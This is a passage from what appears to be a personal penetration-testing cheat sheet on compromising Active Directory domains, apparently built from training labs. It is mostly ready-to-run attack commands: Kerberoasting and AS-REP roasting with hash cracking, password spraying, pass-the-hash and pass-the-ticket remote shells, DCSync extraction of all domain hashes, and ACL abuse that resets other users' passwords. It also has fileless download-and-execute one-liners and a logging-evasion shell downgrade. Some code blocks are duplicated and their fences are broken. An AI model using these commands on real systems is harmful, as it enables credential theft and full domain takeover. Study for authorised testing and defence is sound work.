> launch with --no-sandbox
> import zip data 
> ```
> 💡 **What it does:** Initializes the local Neo4j graph database platform service instance, which serves as the data processor for the BloodHound analysis tool.

---
```




> [!check] 🐧 Linux Bash: Targeted LDAP Query Tracking Cleartext Access Tokens inside Description Attributes
> 
> Filters LDAP queries to scan account descriptions for plaintext passwords or administrative notes left by support teams.
> 
> Bash
> 
> Bash
> 
> ```
> ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(&(objectClass=user)(description=*))" sAMAccountName description
> ```

> [!check] 🪟 PowerShell: Native Active Directory Management Schema Ingress Interrogation Queries
> 
> Uses PowerView commands to query active user properties, group membership parameters, domain trusts, and object security settings.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> # Load power view module script into current environment:
> . .\PowerView.ps1
> # Alternative direct in-memory loading method over network:
> powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1')"
> 
> # Execute targeted object queries:
> Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description}
> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
> Get-DomainComputer | select name,operatingsystem,dnshostname
> Get-DomainGPO | select displayname,gpcfilesyspath
> Get-DomainTrust
> Find-DomainShare -CheckShareAccess | select name,path
> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "Write|All|Force"}
> ```


> [!check] AD CREDENTIAL Enum WINDOWS
```
# Check for present PowerShell modules and load the Active Directory module
Get-Module
Import-Module ActiveDirectory

# Gather basic domain details (SID, functional level, child domains)
Get-ADDomain

# Enumerate all domain trust relationships across the forest
Get-ADTrust -Filter *

# Filter for domain users with an SPN set (Kerberoasting targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# List the names of all Active Directory groups in the domain
Get-ADGroup -Filter * | select name

# View detailed properties of a specific group
Get-ADGroup -Identity "Backup Operators"

# List all members belonging to a specific group
Get-ADGroupMember -Identity "Backup Operators"

# Import PowerView script to begin advanced domain enumeration
Import-Module .\PowerView.ps1

# Retrieve detailed account and policy properties for a target user
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Recursively list all members of a group including nested group memberships
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Map out all trust relationships for the current domain and others seen
Get-DomainTrustMapping

# Check if your current session has administrative access to a remote host
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Find all domain accounts with a Service Principal Name (SPN) set via PowerView
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# View the argument list and help menu for a specific SharpView method
.\SharpView.exe Get-DomainUser -Help

# Enumerate user properties using the .NET port of PowerView (SharpView)
.\SharpView.exe Get-DomainUser -Identity forend

# Scan domain hosts for readable shares and hunt for sensitive file data
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

# Collect comprehensive AD graph data and save it to a zip file for BloodHound
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```


> [!check] ACL Enum
```
# Perform an extensive, unfiltered search for interesting ACLs across the entire domain (noisy)
Find-InterestingDomainAcl

# Convert a target domain username to its corresponding unique Security Identifier (SID)
$sid = Convert-NameToSid wley

# Locate domain objects where a specific account SID has explicit rights (unresolved raw GUIDs)
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Map a specific unresolved Active Directory Rights-GUID to its human-readable property name
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ? {$_.rightsGuid -eq $guid} | fl

# Enumerate objects a specific SID has control over with human-readable permissions resolved automatically
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Export a complete flat list of all domain user samAccountNames to a local text file
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# Manually parse explicit ACE entries targeting a specific user via a native PowerShell loop (No PowerView required)
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {Get-Acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

# Convert the second target account name to its corresponding SID for chained path discovery
$sid2 = Convert-NameToSid damundsen

# Discover all downstream objects controlled by the secondary compromised account with resolved GUIDs
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

# Query group configurations to determine nesting structures and inherited parent memberships
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

# Convert a target security group name to its corresponding SID for rights mapping
$itgroupsid = Convert-NameToSid "Information Technology"

# Audit permissions granted to a nested parent group to identify transitive control vectors
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

# Convert the high-value target user name to its corresponding SID to verify critical edge permissions
$adunnsid = Convert-NameToSid adunn

# Audit inbound permissions on the domain root object for a user to verify DCSync rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```
## Phase 2: Credential Attacks (Quick Wins)

### AS-REP Roasting

> [!warning] 🐧 Linux Bash: Querying Accounts Lacking Kerberos Pre-Authentication Configuration Protections
> 
> Requests authentication tickets (TGTs) for a domain account with pre-authentication disabled, saving the response hash for offline cracking.
> 
> Bash
> 
> Bash
> 
> ```
> GetNPUsers.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -format hashcat -outputfile asrep.txt
> ```

> [!warning] 🐧 Linux Bash: Checking Global Domain Object Dictionary Files for Disabled Pre-Auth Parameters
> 
> Automatically queries a list of usernames to harvest AS-REP ticket hashes without needing account passwords.
> 
> Bash
> 
> Bash
> 
> ```
> GetNPUsers.py corp.local/ -usersfile domain_users.txt -dc-ip 192.168.x.100 -no-pass -format hashcat
> ```

> [!warning] 💾 Windows CMD: Native Ticket Extraction Requests targeting AS-REP Roastable Signatures
> 
> Uses Rubeus to scan for and extract roastable AS-REP ticket hashes directly from a Windows command session.
> 
> DOS
> 
> DOS
> 
> ```
> .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
> ```

> [!check] 🐧 Linux Bash: Offline Decryption of Extracted AS-REP Pre-Authentication Ticket Hashes Matrices
> 
> Runs dictionary cracking attacks against harvested AS-REP tickets using specific rule sets.
> 
> Bash
> 
> Bash
> 
> ```
> hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
> hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```

### Kerberoasting

> [!warning] 🐧 Linux Bash: Requesting Service Ticket Containers mapped to Core Application Principals (Kerberoasting)
> 
> Requests Kerberos Service Tickets (TGS) for accounts tied to Service Principal Names (SPNs) to extract their password hashes.
> 
> Bash
> 
> Bash
> 
> ```
> GetUserSPNs.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -outputfile kerb.txt
> ```

> [!warning] 🐧 Linux Bash: Requesting SPN Service Tickets using Authenticated User NT Hashes Strings
> 
> Requests service tickets by authenticating to the domain controller using an active account's NTLM hash.
> 
> Bash
> 
> Bash
> 
> ```
> GetUserSPNs.py corp.local/stephanie -hashes :<NTLM_HASH> -dc-ip 192.168.x.100 -request -outputfile kerb.txt
> ```

>[!check] Keberoasting From Linux 
```
# Enumerate and list all SPN accounts in the domain
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request and download TGS tickets for all discovered SPN accounts
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Request and save the TGS ticket for a specific target account to a file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Perform an offline dictionary attack against the saved ticket using Hashcat (Mode 13100)
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

# Verify the cracked credentials against the Domain Controller to check privileges
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

> [!check] Kerberoasting from Windows
```
# Enumerate and list all SPN accounts in the domain using built-in binary
setspn.exe -Q */*

# Request and load TGS ticket for a single target account into memory (PowerShell)
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Request and load TGS tickets for all discovered SPN accounts into memory (PowerShell)
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Extract loaded tickets from memory and export them as Base64 encoded strings via Mimikatz
mimikatz.exe "base64 /out:true" "kerberos::list /export" exit

# Extract loaded tickets from memory and write them directly to disk as .kirbi files via Mimikatz
mimikatz.exe "kerberos::list /export" exit

# Clean column wrapping from a raw Base64 ticket blob (Linux processing)
echo "base64_blob" | tr -d \\n

# Decode a cleaned Base64 ticket stream back into a raw .kirbi file (Linux processing)
cat encoded_file | base64 -d > sqldev.kirbi

# Extract the Kerberos ticket from a .kirbi file into an unformatted crack file
python2.7 kirbi2john.py sqldev.kirbi

# Reformat the extracted crack file into a standardized Hashcat-compatible hash string
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Perform an offline dictionary attack against a saved RC4 (etype 23) ticket using Hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

# Enumerate Active Directory SPN accounts and list samaccountnames using PowerView
Import-Module .\PowerView.ps1; Get-DomainUser * -spn | select samaccountname

# Check the supported encryption types (msDS-SupportedEncryptionTypes) for a specific user via PowerView
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# Request a TGS ticket for a specific user and output it directly in Hashcat format via PowerView
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Export all domain SPN tickets directly into a CSV file for offline processing via PowerView
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# Gather Kerberoastable account statistics without sending actual ticket requests using Rubeus
.\Rubeus.exe kerberoast /stats

# Request tickets for highly privileged accounts (AdminCount=1) with single-line hash formatting using Rubeus
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Request a TGS ticket for a specific user with single-line hash formatting using Rubeus
.\Rubeus.exe kerberoast /user:testspn /nowrap

# Perform an offline dictionary attack against a saved AES-256 (etype 18) ticket using Hashcat
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt

# Request an RC4 encrypted ticket for an AES-enabled account via ticket delegation downgrades (Pre-Server 2019 DCs)
.\Rubeus.exe kerberoast /usetgtdeleg
```


>[!warning] kerberos double hop issue fix
```
# 1. Register a persistent, custom session configuration endpoint bound to the target credentials
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

# 2. Cycle the Windows Remote Management service to parse the newly registered configuration endpoint
Restart-Service WinRM

# 3. Establish a new PSSession utilizing the explicitly named configuration flag
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess

# Verification: Checking 'klist' inside this session confirms valid cached tickets are present to query the DC
Get-DomainUser -spn | select samaccountname
```
>

> [!warning] 💾 Windows CMD: Requesting Service Ticket Extraction Arrays natively from Connected Memory Loops
> 
> Uses Rubeus within a local Windows session to extract roastable TGS ticket hashes for all accessible domain service accounts.
> 
> DOS
> 
> DOS
> 
> ```
> .\Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
> ```

> [!check] 🐧 Linux Bash: Offline Decryption of Extracted SPN Account TGS Ticket Hashes Data
> 
> Uses Hashcat to crack extracted Kerberos TGS ticket hashes offline using a defined wordlist.
> 
> Bash
> 
> Bash
> 
> ```
> hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
> hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```

### Password Spray (With lockout awareness)

> [!check] 🐧 Linux Bash: Requesting Target Active Domain Lockout Threshold Execution Matrix Rules
> 
> Queries password policy limits to check the lockout threshold before executing any horizontal authentication attacks.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' --pass-pol
> ```

> [!check] 🐧 Linux Bash: Running Low-Velocity Multi-Account Domain Password Sprays to Avoid Lockouts
> 
> Tests a single low-risk password across a broad list of users, staying safely below lockout limits to discover weak account credentials.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb 192.168.x.100 -u domain_users.txt -p 'Password123' --continue-on-success 2>/dev/null | grep "+"
> 
> kerbrute passwordspray -d corp.local --dc 192.168.x.100 domain_users.txt 'Password123'
> 
> kerbrute passwordspray -d corp.local --dc 192.168.x.100 domain_users.txt 'Corp2024!'
> 
 #turn rrpclient users to list
 rpcclient -U "" -c "enumdomusers" -N 172.16.5.5 | grep "user:" | cut -d '[' -f 2 | cut -d ']' -f 1 > valid_users.txt

> [!Security Controls]
```
# Check Windows Defender Status (Look for RealTimeProtectionEnabled)
Get-MpComputerStatus

# View Active AppLocker Whitelisting Rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Enumerate PowerShell Language Mode (Look for 'ConstrainedLanguage')
$ExecutionContext.SessionState.LanguageMode

# View AD groups officially delegated to read LAPS passwords
Find-LAPSDelegatedGroups

# Check for misconfigured users/groups holding "All Extended Rights" over LAPS
Find-AdmPwdExtendedRights

# Dump cleartext randomized LAPS local admin passwords (Requires administrative rights)
Get-LAPSComputers
```

>[!Note] Windows Living Of The Land 
```
# Host Identity & Comprehensive System Summary
hostname
systeminfo

# OS Kernel Build & Patch Check
[System.Environment]::OSVersion.Version
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Network Interfaces, Active Routes & ARP Table
ipconfig /all
arp -a
route print

# Environment Variables & Domain Discovery
set
echo %USERDOMAIN%
echo %logonserver%

# Check Active/Disconnected Logged-In Users
qwinsta


# Check Loaded Modules & Session Execution Policies
Get-Module
Get-ExecutionPolicy -List

# Process-Scoped Execution Policy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# View Shell Environment Keys & Values
Get-ChildItem Env: | ft Key,Value

# Read Plaintext PowerShell Command History
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# In-Memory Web File Download & Execution
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"

# Downgrade Shell to Avoid Post-v3.0 Script Block Logging
powershell.exe -version 2



# Check Windows Firewall Profile Rule States
netsh advfirewall show allprofiles

# Query Defend Service Status (CMD)
sc query windefend

# Check Comprehensive Antivirus Status & Engine Configurations
Get-MpComputerStatus



# Domain & Trust Layout Dumps via WMI
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
wmic ntdomain list /format:list

# Basic System Architecture & Roles Attributes
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List

# Live Process, Local Account, Group, & Service Account Lists
wmic process list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list


# Local & Domain Password/Lockout Policies
net accounts
net accounts /domain

# Global Domain Group Enumeration & Membership Checks
net group /domain
net group "Domain Admins" /domain
net group "domain computers" /domain
net group "Domain Controllers" /domain
net group "Group Name" /domain
net groups /domain

# Local Account Group Properties & Administrative Additions
net localgroup
net localgroup Administrators
net localgroup administrators /domain
net localgroup administrators Username /add

# Local Shares & Active Network Machines Maps
net share
net view
net view /domain
net view \ComputerName /ALL
net view /all /domain:DomainName

# Account Detail Inspection
net user /domain
net user %username%
net user AccountName /domain

# Mount Remote Share Paths Locally
net use x: \computer\share


# Global User & Computer DN Indexing
dsquery user
dsquery computer

# Wildcard Structural Object Extraction within an OU Path
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

# Custom LDAP Filter: Search for Accounts with 'PASSWD_NOTREQD' (Bitmask 32)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Custom LDAP Filter: Limit Search to 5 Domain Controllers (Bitmask 8192)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

!!!note uac bit mask number can be changed if "2"  
meaning disable account
or 64 encrypted password check onlne for it to change ="<bitmasknum>"
```


# Check Windows Defender Status (Look for RealTimeProtectionEnabled)
Get-MpComputerStatus

# View Active AppLocker Whitelisting Rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Enumerate PowerShell Language Mode (Look for 'ConstrainedLanguage')
$ExecutionContext.SessionState.LanguageMode

# View AD groups officially delegated to read LAPS passwords
Find-LAPSDelegatedGroups

# Check for misconfigured users/groups holding "All Extended Rights" over LAPS
Find-AdmPwdExtendedRights

# Dump cleartext randomized LAPS local admin passwords (Requires administrative rights)
Get-LAPSComputers
```
```


> [!check] 🐧 Linux Bash: Validating User Account Signatures via Kerberos Domain Controllers Interaction Loops
> 
> Programmatically tests usernames against the Kerberos KDC to identify valid domain accounts without generating authentication failure logs on target nodes.
> 
> Bash
> 
> Bash
> 
> ```
> ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
> ```

> [!check] 🐧 Linux Bash: Running Targeted Multi-User Wordlist Sprays over Network SMB Protocols
> 
> Tests a small wordlist of common passwords against targeted account names over standard SMB channels.
> 
> Bash
> 
> Bash
> 
> ```
> netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
> ```

### GPP / SYSVOL

> [!check] 🐧 Linux Bash: Automated Harvesting of Encrypted Group Policy Preferences Passwords from Domain Volumes
> 
> Automatically parses domain Group Policy deployment files to find and extract encrypted `cpassword` strings.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
> crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_autologin
> ```

> [!info] 🐧 Linux Bash: Manual Authenticated Session Interrogation of Sysvol Allocation Partitions
> 
> Connects to the SYSVOL share manually to review Group Policy scripts and configuration objects for hidden administrative parameters.
> 
> Bash
> 
> Bash
> 
> ```
> smbclient //192.168.x.100/SYSVOL -U 'corp.local/stephanie%Password123'
> ```

> [!check] 🐧 Linux Bash: Scanning Shared Policy Configurations XML Repositories for Writable Passwords
> 
> Scans policy XML configurations to extract the encrypted cpassword element, decrypting it using public AES keys.
> 
> Bash
> 
> Bash
> 
> ```
> find /mnt/sysvol -name "*.xml" 2>/dev/null | xargs grep -l "cpassword"
> gpp-decrypt <CPASSWORD_VALUE>
> ```

## Phase 3 & 4: Lateral Movement & Pivoting

### Pass-the-Hash

> [!check] 🐧 Linux Bash: Testing Inbound Target Network Access Profiles using Discovered Local Account Hashes
> 
> Authenticates across systems using harvested NTLM hashes to check for administrative permissions or password reuse patterns.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth
> netexec smb <TARGET_IP> -u user -H <NTLM_HASH>
> ```

> [!check] 🐧 Linux Bash: Broad Range Subnet Account Verification via Pass-The-Hash Injection Loops
> 
> Sprays an NTLM hash across an entire network segment to locate systems that share the same administrative account credentials.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> --local-auth --continue-on-success | grep "+"
> ```

> [!example] 🐧 Linux Bash: Spawning Interactive Remote Process Terminals via Injected NT Hashes Strings
> 
> Uses Impacket tools or WinRM to execute commands and open administrative shell sessions on remote targets via Pass-the-Hash.
> 
> Bash
> 
> Bash
> 
> ```
> psexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
> wmiexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>
> smbexec.py corp.local/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>  # Executes without dropping file binaries to disk
> evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
> ```

### Pass-the-Ticket

> [!check] 💾 Windows CMD: Triage Auditing of Stored Kerberos Authentication Tickets in Current Session Memory
> 
> Scans the current session's volatile memory space to find and extract active Kerberos ticket keys.
> 
> DOS
> 
> DOS
> 
> ```
> .\Rubeus.exe triage
> .\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
> ```

> [!example] 💾 Windows CMD: Injecting Extracted Base64 Kerberos Ticket Strings into System Volatile Space
> 
> Injects a valid base64-encoded Kerberos ticket into the current execution thread to hijack the user's network access rights.
> 
> DOS
> 
> DOS
> 
> ```
> .\Rubeus.exe ptt /ticket:<BASE64_TICKET>
> ```

> [!example] 💾 Windows CMD: Generating Remote Authentication Tickets natively via Stored Secret Passwords
> 
> Converts an account's NTLM hash to request a valid Kerberos TGT from the domain controller, injecting it immediately into the running session.
> 
> DOS
> 
> DOS
> 
> ```
> .\Rubeus.exe asktgt /user:administrator /rc4:<NTLM_HASH> /domain:corp.local /dc:192.168.x.100 /ptt
> dir \\<TARGET_FQDN>\C$
> ```

> [!example] 🐧 Linux Bash: Registering Exfiltrated Credential Caches for Corporate Kerberos Authenticated Access Paths
> 
> Exports a stolen Kerberos credential cache (.ccache) file to authenticate safely across domain network resources from a Linux platform.
> 
> Bash
> 
> Bash
> 
> ```
> export KRB5CCNAME=/tmp/ticket.ccache
> psexec.py -k -no-pass corp.local/administrator@<TARGET_FQDN>
> ```

### Overpass-the-Hash

> [!example] 💾 Windows CMD: Generating Valid Kerberos Domain TGT Containers via Local Pass-The-Hash Conversion Calls
> 
> Uses Rubeus to pass an NTLM hash to the domain controller, requesting a valid TGT to upgrade execution contexts without plain text credentials.
> 
> DOS
> 
> DOS
> 
> ```
> .\Rubeus.exe asktgt /user:user /rc4:<NTLM_HASH> /domain:corp.local /ptt
> ```

> [!example] 🐧 Linux Bash: Requesting Outbound Domain TGT Sessions over Network Channels via NT Hashing Arrays
> 
> Uses Impacket tools to remotely request a Kerberos TGT using an NTLM hash string, exporting the generated ticket for subsequent authentication calls.
> 
> Bash
> 
> Bash
> 
> ```
> getTGT.py corp.local/user -hashes :<NTLM_HASH> -dc-ip 192.168.x.100
> export KRB5CCNAME=user.ccache
> psexec.py -k -no-pass corp.local/user@<TARGET_FQDN>
> ```

## Phase 5: Privilege Escalation to Domain Admin

### DCSync Attack

> [!check] 🪟 PowerShell: Verifying Inbound Account Profile Active Directory Database Synchronization Replication Rights
> 
> Audits object access permissions on the domain root to verify if the compromise profile holds Directory Replication privileges.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | \
>      Where-Object {($_.ObjectAceType -match "Replication-Get") -and \
>         ($_.ActiveDirectoryRights -match "ExtendedRight")}
> ```

> [!check] 🐧 Linux Bash: Launching Remote DCSync Administrative Accounts Replication Requests
> 
> Abuses replication rights to impersonate a domain controller and remotely extract password hashes for high-value targets (such as `krbtgt`).
> 
> Bash
> 
> Bash
> 
> ```
> secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
> secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
> secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator
> ```

> [!check] 💾 Windows CMD: Native DCSync Active Directory Credential Extraction Loops
> 
> Uses Mimikatz commands within an authorized session to pull cleartext or encrypted domain master hashes straight via DCSync protocols.
> 
> DOS
> 
> DOS
> 
> ```
> lsadump::dcsync /user:krbtgt /domain:corp.local
> lsadump::dcsync /user:Administrator /domain:corp.local
> lsadump::dcsync /all /domain:corp.local      # Extracts all hashes from the domain
> ```



>[!check] DCSyn Attack 
```
# Active Directory DCSync Attack: Complete Reference Guide



---

## 1. Core Mechanics of DCSync

The **DCSync** attack leverages legitimate Active Directory replication features to extract password hashes filelessly over the network. 

* **The Protocol:** It utilizes the **MS-DRSR (Directory Replication Service Remote Protocol)**, which Domain Controllers use to synchronize domain databases.
* **The Technique:** Instead of cracking the database offline or dumping process memory locally, an attacker impersonates a Domain Controller and requests account updates. The targeted Domain Controller then transmits the requested NTLM hashes or Kerberos keys directly over the network wire.

---

## 2. Active Directory Rights Verification (Windows / PowerShell)

Before executing the attack, you must verify that the compromised user account possesses replication permissions over the domain root node. This is audited using the **PowerView** module.

```powershell
# Step 1: Query target user account properties to extract the specific Object SID
Get-DomainUser -Identity adunn | select samaccountname, objectsid, memberof, useraccountcontrol | fl

# Step 2: Store the retrieved Security Identifier (SID) into a local variable
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"

# Step 3: Check the root domain Access Control List (ACL) for explicit replication permissions
# This filters for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights mapping flags
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl

# Step 4: Scan the domain for accounts configured with Reversible Encryption Enabled
# Method A: Using standard Active Directory PowerShell Cmdlet directly
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# Method B: Using PowerView to filter by the ENCRYPTED_TEXT_PWD_ALLOWED string match
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname, useraccountcontrol



#linux 
# Execute a full domain database extraction using the compromised account credentials
# This outputs NTLM hashes, Kerberos keys, and cleartext passwords into files prefixed with 'inlanefreight_hashes'
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# Advanced Command Variations:

# Variation A: Extract NTLM hashes exclusively (skips processing Kerberos authentication keys)
secretsdump.py -outputfile inlanefreight_ntlm_only -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5

# Variation B: Target a single specific high-value user account to minimize network footprint noise
secretsdump.py -outputfile targeted_user_hash -just-dc-user Administrator INLANEFREIGHT/adunn@172.16.5.5

# Variation C: Pull complete domain password history loops for offline cracking strength metrics
secretsdump.py -outputfile domain_history -just-dc -history INLANEFREIGHT/adunn@172.16.5.5

# Variation D: Append administrative account status metadata (disabled flags, password last set dates)
secretsdump.py -outputfile domain_triage -just-dc -pwd-last-set -user-status INLANEFREIGHT/adunn@172.16.5.5

# Step 2: Read decrypted cleartext values leaked via Reversible Encryption accounts
cat inlanefreight_hashes.ntds.cleartext

```
### ACL Abuse — Common Paths from BloodHound

>[!check] ACL Abuse
```
# AD ACL Abuse Chain Command Summary

# 1. Create a credential object for the 'wley' account (initial foothold)
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# 2. Define the new target password block for the 'damundsen' account
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# 3. Force change the target user's password using wley's administrative credentials
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# 4. Create a new credential object using the newly compromised 'damundsen' account
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# 5. Check the current membership list of the target Help Desk group
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

# 6. Leverage GenericWrite rights to add 'damundsen' to the Help Desk Level 1 group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# 7. Verify that the user was successfully added to the target group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# 8. Leverage inherited GenericAll rights to write a fake SPN attribute to 'adunn'
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# 9. Request a service ticket for the newly created fake SPN to extract the hash
.\Rubeus.exe kerberoast /user:adunn /nowrap

# 10. Clean up: Erase the fake SPN attribute from the adunn user object
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# 11. Clean up: Remove damundsen from the Help Desk Level 1 group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

# 12. Clean up verification: Confirm damundsen was successfully evicted from the group
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose

# 13. Defensive: Convert an SDDL security string from Event ID 5136 into readable text
ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)..."
```

>[!check] ACL Abuse 🩸 BloodyAD & Impacket Master Field Manual
```
> bloodyAD --host 192.168.1.11 -d ignite.local -u administrator -p 'Ignite@987' get children --otype useronly
> ```

